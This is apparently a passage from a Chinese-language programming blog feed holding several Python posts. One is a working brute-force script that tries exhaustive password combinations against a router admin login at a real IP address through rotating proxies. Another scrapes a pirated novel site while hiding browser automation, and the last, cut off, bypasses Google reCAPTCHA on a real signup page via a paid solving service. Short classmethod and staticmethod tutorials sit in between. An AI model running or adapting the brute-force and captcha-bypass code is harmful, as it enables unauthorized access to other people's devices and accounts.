class="string">r&#x27;[0-9]+(?:\.[0-9])+.+[0-9]&#123;3&#125;&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># print(ips)</span></span><br><span class="line">    proxy = &#123;<span class="string">&#x27;http&#x27;</span>: ips[<span class="number">0</span>]&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前代理ip地址为：&quot;</span>,proxy)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用加密后的密码开始登陆路由器后台</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">user,password</span>):</span></span><br><span class="line">    ip = ip_out()</span><br><span class="line">    <span class="comment"># 实例化 user-agent 对象</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    dict_1 = &#123;<span class="string">&quot;User-Agents&quot;</span>:ua.random,<span class="string">&quot;isOF&quot;</span>: <span class="number">1</span>, <span class="string">&quot;txtUserName&quot;</span>:user,<span class="string">&quot;txtPwd&quot;</span>:password&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># requests.get(&#x27;http://183.230.147.88:8081/&#x27;,proxies=ip )# headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://183.230.147.88:8081/Ajax/UserLogin.ashx&#x27;</span>,data=dict_1,proxies=ip)</span><br><span class="line"></span><br><span class="line">    code = r.text</span><br><span class="line">    <span class="keyword">if</span> code == <span class="string">&quot;password error&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登陆返回值：&#x27;</span>, code, <span class="string">&quot;密码错误，继续尝试登陆.......&quot;</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登陆返回值：&#x27;</span>, code, <span class="string">&quot;密码正确，登陆成功！！！！！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="comment"># 密码字典  生成密码</span></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_z_Z_symbol</span>(<span class="params">a=<span class="number">5</span>,count=<span class="number">0</span></span>):</span></span><br><span class="line">    time_sleep = random.random()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我认为的所有密码：</span></span><br><span class="line"><span class="string">    数字 + 小写字母 + 大写字母 + 符号</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*?_-.&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./try错过的密码.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">17</span>):  <span class="comment"># 密码长度  从5位数开始  16位数密码结束</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(chars, repeat=i):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                password = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;*************** 第 &#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; 组密码 ***************&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> login(user,password) != <span class="string">&quot;password error&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;密码破解成功，程序退出！&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    f.write(password+<span class="string">r&#x27;\n&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(password,<span class="string">&#x27;已写入...错过的密码.txt&#x27;</span>)</span><br><span class="line">                    f.close()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># if count % 50 == 0 :</span></span><br><span class="line">                <span class="comment">#     time.sleep(5)</span></span><br><span class="line">                <span class="comment">#     print(&quot;每50次尝试密码后，暂停5秒&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    <span class="comment"># 开始破解</span></span><br><span class="line">    num_z_Z_symbol()</span><br><span class="line">    <span class="comment"># 测试ip代理</span></span><br><span class="line">    <span class="comment"># ip_out()</span></span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>笔趣阁_爬小说</title>
    <url>//%E7%AC%94%E8%B6%A3%E9%98%81_%E7%88%AC%E5%B0%8F%E8%AF%B4</url>
    <content><![CDATA[<h1 id="笔趣阁-爬小说"><a href="#笔趣阁-爬小说" class="headerlink" title="笔趣阁_爬小说"></a>笔趣阁_爬小说</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异界之魔武流氓    针对  脚本  test  demo</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> lxml.etree <span class="keyword">import</span> HTML</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ip代理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_out</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://proxy.httpdaili.com/apinew.asp?sl=3&amp;noinfo=true&amp;text=1&amp;ddbh=1420927609453534893&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;代理ip状态码：&quot;</span>, r.status_code)</span><br><span class="line">    t = r.text</span><br><span class="line">    <span class="comment"># 正则匹配ip段and端口号</span></span><br><span class="line">    ips = re.findall(<span class="string">r&#x27;[0-9]+(?:\.[0-9])+.+[0-9]&#123;3&#125;&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># print(ips)</span></span><br><span class="line">    proxy = &#123;<span class="string">&#x27;http&#x27;</span>: ips[<span class="number">0</span>]&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前代理ip地址为：&quot;</span>, proxy)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 计算时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_out</span>(<span class="params">a_func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clocked</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = a_func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序：&quot;</span> + a_func.__name__, <span class="string">&quot;    运行时间：&quot;</span> + <span class="built_in">str</span>(end - start))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clocked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 章节详情页 url拼接数字迭代</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_num</span>(<span class="params">num=<span class="number">17907917</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num, num + <span class="number">1179</span>):</span><br><span class="line">        <span class="keyword">yield</span> <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始请求 url地址</span></span><br><span class="line"><span class="meta">@time_out</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_number</span>(<span class="params">num=add_num(<span class="params"></span>), aa=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="comment"># page_url = url + nu + &quot;.html&quot;</span></span><br><span class="line">        page_url = driver.current_url</span><br><span class="line">        <span class="built_in">print</span>(page_url, <span class="string">&#x27;   00000000000000000000000000000000000000000000000000&#x27;</span>)</span><br><span class="line">        driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">        content = driver.page_source</span><br><span class="line">        <span class="comment"># 章节名字</span></span><br><span class="line">        title = driver.find_elements_by_xpath(<span class="string">&#x27;//*[@id=&quot;wrapper&quot;]/div[4]/div/div[2]/h1&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        <span class="built_in">print</span>(title)</span><br><span class="line">        html = HTML(content)</span><br><span class="line">        txt = html.xpath(<span class="string">&quot;//div[@id=&#x27;content&#x27;]/text()&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./异界之魔武流氓.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            f.write(<span class="string">&#x27;\t&#x27;</span> + title + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">                ok = <span class="built_in">str</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(ok)</span><br><span class="line">                f.write(ok + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            f.close()</span><br><span class="line">        driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;wrapper&quot;]/div[4]/div/div[6]/a[3]&#x27;</span>).click()</span><br><span class="line">        driver.implicitly_wait(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title == <span class="string">&#x27;第1178章至尊界主（大结局）&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;############################  全书已下载完成  ############################ \n&quot;</span> * <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 实例化 user-agent 对象</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 更换头部</span></span><br><span class="line">    options.add_argument(<span class="string">&#x27;user-agent=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ua.random))</span><br><span class="line">    <span class="comment"># 浏览器扩展程序</span></span><br><span class="line">    <span class="comment"># xpath程序</span></span><br><span class="line">    extension_path2 = <span class="string">&#x27;../2.0.2_0.crx&#x27;</span></span><br><span class="line">    options.add_extension(extension_path2)</span><br><span class="line">    driver = webdriver.Chrome(options=options)  <span class="comment"># driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line">    <span class="comment"># 浏览器窗口最大化</span></span><br><span class="line">    driver.maximize_window()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;https://www.biqugee.com/book/35456/17907917.html &#x27;</span></span><br><span class="line">    driver.get(url)</span><br><span class="line"></span><br><span class="line">    page_number()</span><br><span class="line"></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>Python classmethod 修饰符</title>
    <url>//classmethod</url>
    <content><![CDATA[<h1 id="Python-classmethod-修饰符"><a href="#Python-classmethod-修饰符" class="headerlink" title="Python classmethod 修饰符"></a>Python classmethod 修饰符</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p><strong>classmethod</strong> 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。</p>
<h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">classmethod</span></span><br></pre></td></tr></table></figure>

<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回函数的类方法。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以下实例展示了 classmethod 的使用方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    bar = <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;foo&#x27;</span>) </span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">func2</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;func2&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (cls.bar)</span><br><span class="line">        cls().func1()   <span class="comment"># 调用 foo 方法</span></span><br><span class="line"> </span><br><span class="line">A.func2()               <span class="comment"># 不需要实例化</span></span><br></pre></td></tr></table></figure>

<p>以上实例输出结果为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func2</span><br><span class="line"><span class="number">1</span></span><br><span class="line">foo</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>有趣</category>
      </categories>
      <tags>
        <tag>奇怪的知识</tag>
      </tags>
  </entry>
  <entry>
    <title>python cls方法_关于类方法中的cls</title>
    <url>//python%20cls%E6%96%B9%E6%B3%95_%E5%85%B3%E4%BA%8E%E7%B1%BB%E6%96%B9%E6%B3%95%E4%B8%AD%E7%9A%84cls</url>
    <content><![CDATA[<h1 id="python-cls方法-关于类方法中的cls"><a href="#python-cls方法-关于类方法中的cls" class="headerlink" title="python cls方法_关于类方法中的cls"></a>python cls方法_关于类方法中的cls</h1><h3 id="描述"><a href="#描述" class="headerlink" title="描述:"></a>描述:</h3><p>​                在python的类方法中，默认使用的第一个参数是cls，而在实例方法中，一般使用self作为第一个参数</p>
<h3 id="两处比较："><a href="#两处比较：" class="headerlink" title="两处比较："></a>两处比较：</h3><h4 id="1-比较一般类方法中的-self-和-cls-的区别："><a href="#1-比较一般类方法中的-self-和-cls-的区别：" class="headerlink" title="(1)  比较一般类方法中的 self 和 cls 的区别："></a>(1)  比较一般类方法中的 self 和 cls 的区别：</h4><p>​                一般来说，使用某个类的方法，需要先将类实例化，赋予一个对象才可以调用类中的方法，但是如果使用了@staticmethod 或@classmethod，就可以不用实例化，直接类名.方法名()来调用。这有利于组织代码，把某些应该属于某个类的函数给放到那个类里去，同时有利于命名空间的整洁。</p>
<p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    a = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod    </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo1</span>(<span class="params">name</span>):</span>  <span class="comment"># 静态函数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo2</span>(<span class="params">self, name</span>):</span>  <span class="comment"># 常规函数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod          </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo3</span>(<span class="params">cls, name</span>):</span>  <span class="comment"># 类方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接着我们实例化A类</span></span><br><span class="line">a = A()</span><br><span class="line"></span><br><span class="line">a.foo1(<span class="string">&#x27;ma&#x27;</span>)  <span class="comment"># output:hello ma</span></span><br><span class="line">A.foo1(<span class="string">&#x27;ma&#x27;</span>)  <span class="comment"># output:hello ma</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">而foo2是常规函数，只能通过类的实例化来调用，即a.foo2()来调用。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a.foo2(<span class="string">&#x27;杨晓东&#x27;</span>) <span class="comment"># output:hello 杨晓东</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">而foo3是类函数，cls作为第一个参数用来表示类本身，在类方法中用到，类方法只是与类本身有关而与实例无关的方法。</span></span><br><span class="line"><span class="string">可以通过实例化来调用，也可以通过  类名.类函数名  来调用。</span></span><br><span class="line"><span class="string">即  a.foo3(&#x27;mam&#x27;)  或  A.foo3(&#x27;mam&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a.foo3(<span class="string">&#x27;mam&#x27;</span>)  <span class="comment"># output:hello mam</span></span><br><span class="line">A.foo3(<span class="string">&#x27;mam&#x27;</span>)  <span class="comment"># output:hello mam</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-staticmethod-和-classmethod方法的区别"><a href="#2-staticmethod-和-classmethod方法的区别" class="headerlink" title="(2)  staticmethod  和  classmethod方法的区别:"></a>(2)  staticmethod  和  classmethod方法的区别:</h4><p>​                在classmethod中可以调用类中定义的其他方法、类的属性，但staticmethod只能通过A.a调用类的属性，但无法通过在该函数内部调用A.foo2()。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    a = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo1</span>(<span class="params">name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo2</span>(<span class="params">self, name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo3</span>(<span class="params">cls, name</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>, name)</span><br><span class="line">        <span class="built_in">print</span>(cls().foo2(<span class="string">&#x27;杨晓东&#x27;</span>))  <span class="comment"># 可以在foo3中调用foo2，因为持有cls参数，彷佛是类本身，故可以调用该foo2方法。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.a)                <span class="comment"># output:a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.foo3(<span class="string">&#x27;杨晓东3&#x27;</span>))   <span class="comment"># output:hello 杨晓东3</span></span><br><span class="line">                          <span class="comment"># output:hello 杨晓东</span></span><br><span class="line"></span><br><span class="line">B = A()					<span class="comment"># 实例化类</span></span><br><span class="line"><span class="built_in">print</span>(B.foo2(<span class="string">&#x27;杨晓东2&#x27;</span>))  <span class="comment"># output:hello 杨晓东2     普通类方法，实例化后正常调用&amp;输出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.foo2(<span class="string">&#x27;杨晓东22&#x27;</span>))  <span class="comment">#  因为没有实例化类    报错: unbound method foo2() must be called with A instance as first argument (got str instance instead)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第三点是关于cls-，其实这就是类本身，比如这里的cls-A，如果cls-里面有参数，那么这个参数就是构造函数init-self-parameter1-parameter2）中的参数1，2，同时还是表示类本身。"><a href="#第三点是关于cls-，其实这就是类本身，比如这里的cls-A，如果cls-里面有参数，那么这个参数就是构造函数init-self-parameter1-parameter2）中的参数1，2，同时还是表示类本身。" class="headerlink" title="第三点是关于cls()，其实这就是类本身，比如这里的cls()=A，如果cls()里面有参数，那么这个参数就是构造函数init(self,parameter1,parameter2）中的参数1，2，同时还是表示类本身。"></a>第三点是关于cls()，其实这就是类本身，比如这里的cls()=A，如果cls()里面有参数，那么这个参数就是构造函数<strong>init</strong>(self,parameter1,parameter2）中的参数1，2，同时还是表示类本身。</h4><p>举例：</p>
<p><img src="http://markdownimg.demo443.com/imgs/python_cls.jpg" class="lazyload" data-srcset="http://markdownimg.demo443.com/imgs/python_cls.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="python_cls"></p>
]]></content>
      <categories>
        <category>有趣</category>
      </categories>
      <tags>
        <tag>奇怪的知识</tag>
      </tags>
  </entry>
  <entry>
    <title>staticmethod() 函数</title>
    <url>//staticmethod</url>
    <content><![CDATA[<h1 id="python-staticmethod-函数"><a href="#python-staticmethod-函数" class="headerlink" title="python  staticmethod() 函数"></a>python  staticmethod() 函数</h1><p>python staticmethod 返回函数的静态方法。</p>
<p>该方法不强制要求传递参数，如下声明一个静态方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">arg1, arg2, ...</span>):</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>以上实例声明了静态方法 <strong>f</strong>，从而可以实现实例化使用 **C().f()**，当然也可以不实例化调用该方法 **C.f()**。</p>
<h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">staticmethod</span>(function)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;杨晓东&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">C.f();          <span class="comment"># 静态方法无需实例化</span></span><br><span class="line">cobj = C()</span><br><span class="line">cobj.f()        <span class="comment"># 也可以实例化后调用</span></span><br></pre></td></tr></table></figure>

<p>以上实例输出结果为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">杨晓东</span><br><span class="line">杨晓东</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>有趣</category>
      </categories>
      <tags>
        <tag>奇怪的知识</tag>
      </tags>
  </entry>
  <entry>
    <title>Google验证码打码</title>
    <url>//Google%E9%AA%8C%E8%AF%81%E7%A0%81%E6%89%93%E7%A0%81</url>
    <content><![CDATA[<h1 id="Google验证码-打码"><a href="#Google验证码-打码" class="headerlink" title="Google验证码_打码"></a>Google验证码_打码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_date</span>(<span class="params">timestr</span>):</span></span><br><span class="line">    nowTime_str = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">    <span class="comment"># mktime参数为struc_time,将日期转化为秒，</span></span><br><span class="line">    e_time = time.mktime(time.strptime(nowTime_str, <span class="string">&quot;%Y-%m-%d&quot;</span>))</span><br><span class="line">    <span class="comment"># print(e_time)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s_time = time.mktime(time.strptime(timestr, <span class="string">&#x27;%Y-%m-%d&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(s_time)</span></span><br><span class="line">        <span class="comment"># 日期转化为int比较</span></span><br><span class="line">        diff = <span class="built_in">int</span>(s_time) - <span class="built_in">int</span>(e_time)</span><br><span class="line">        <span class="comment"># print(diff)</span></span><br><span class="line">        <span class="keyword">if</span> diff &gt;= <span class="number">0</span>:</span><br><span class="line">            is_true = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(&#x27;True&#x27;)</span></span><br><span class="line">            <span class="keyword">return</span> is_true</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_true = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># self.show_data.emit(&#x27;测试版本已不能试用！！！&#x27;)</span></span><br><span class="line">            <span class="comment"># print(&#x27;测试版本已不能试用！！！&#x27;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;False&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> is_true</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeleniumTest</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;用来测试selenium相关脚本&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url = <span class="string">&quot;https://www.ispfsb.com/Public/FOID.aspx&quot;</span></span><br><span class="line">        self.__options = webdriver.ChromeOptions()</span><br><span class="line">        self.__options.binary_location = <span class="string">&quot;C:\Program Files\Google\Chrome\Application\chrome.exe&quot;</span></span><br><span class="line">        self.driver = webdriver.Chrome(options=self.__options)</span><br><span class="line">        self.driver.maximize_window()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">response</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://www.ispfsb.com/Reg/signup.aspx&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;g-recaptcha-response&quot;</span>: response&#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_task</span>():</span></span><br><span class="line">        url = <span class="string">&#x27;http://api.recaptcha.press/task/create?siteKey=6LdAHv8UAAAAAC-KuK02qHMG7nLPZ3WpxZs7eG6K&amp;siteReferer=https://www.ispfsb.com/&amp;authorization=0a389ac1-ab1a-4d60-a089-1f182bd12461&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span 